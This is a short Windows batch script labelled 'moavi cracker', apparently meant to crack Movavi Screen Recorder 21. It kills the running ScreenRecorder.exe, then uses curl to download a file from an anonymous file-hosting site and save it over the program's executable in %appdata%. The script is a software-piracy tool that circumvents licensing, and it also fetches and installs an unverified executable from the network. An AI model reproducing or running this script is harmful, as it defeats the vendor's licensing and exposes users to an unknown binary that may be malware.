REM set title to moavi cracker
@echo off
cls
title moavi cracker

REM kill all moavi processes

taskkill /F /IM ScreenRecorder.exe

REM go into download crack to %appdata%\Movavi Screen Recorder 21

cd %appdata%/Movavi Screen Recorder 21

curl https://files.catbox.moe/d0wo3h.moavi -o ScreenRecorder.exe

pause 